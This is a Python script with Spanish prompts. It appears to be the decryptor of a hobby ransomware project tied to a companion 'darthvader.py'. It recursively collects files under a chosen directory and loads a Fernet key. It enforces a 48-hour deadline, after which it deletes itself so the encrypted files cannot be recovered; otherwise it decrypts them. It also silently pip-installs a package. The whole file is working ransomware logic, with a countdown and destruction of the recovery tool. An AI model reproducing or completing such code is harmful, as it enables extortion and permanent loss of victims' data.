import subprocess # Import the subprocess module
import sys # Import the sys module
import os # Import the os module
import socket # Import the socket module
from datetime import datetime, timedelta # Import the datetime and timedelta
#Install cryptography module
def install(package): # Install the required package
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('cryptography') # Install the cryptography package
from cryptography.fernet import Fernet  # Import the Fernet class from the cryptography module

files = [] # List to store the files in the current directory
def recorrer_arbol_directorios(directory):
    global files
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    # Ignora los directorios relacionados con Python.
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    # Ignora los archivos relacionados con Python
                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except Exception as e:
        print("Mondongo")
    print(files)
recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))

with open("key.key", "rb") as key_file:
    key = key_file.read()

while True:
    print("1. Desencriptar archivos")
    print("2. Salir")
    choice = input("Elige una opción: ")
    with open("encryption_time.txt", "r") as f:
        encryption_time = datetime.fromisoformat(f.read().strip())
    elapsed_time = datetime.now() - encryption_time
    print("Han pasado",elapsed_time, "De las 48 horas permitidas\n")
    if choice == "1":
        if elapsed_time > timedelta(hours=48):
            print("Han pasado más de 48 horas desde la encriptación. Advertencia!")
            os.remove("decrypt.py")
            sys.exit(1)
        else:
            for file in files:
                with open(file, "rb") as f:
                    data = f.read()
                data_decrypted = Fernet(key).decrypt(data)
                with open(file, "wb") as f:
                    f.write(data_decrypted)
    elif choice == "2":
        break
    else:
        print("Opción no válida. Inténtalo de nuevo.")